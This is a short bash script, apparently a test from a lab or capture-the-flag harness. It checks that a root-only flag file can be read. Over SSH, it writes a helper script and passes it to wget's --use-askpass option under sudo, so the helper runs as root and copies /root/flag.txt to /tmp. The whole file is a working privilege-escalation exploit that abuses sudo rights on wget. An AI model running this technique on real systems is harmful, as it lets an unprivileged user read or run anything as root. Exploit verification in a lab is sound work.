#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# askpass helper writes the flag as root; wget then uses dummy auth.
out="$(ssh_run '
TF=$(mktemp)
cat > "$TF" <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/wget_flag
echo unused
EOF
chmod +x "$TF"
rm -f /tmp/wget_flag
sudo -n /usr/bin/wget --use-askpass="$TF" http://127.0.0.1:9 >/dev/null 2>&1 || true
rm -f "$TF"
cat /tmp/wget_flag 2>/dev/null || true
')"
assert_root_output "${out}"
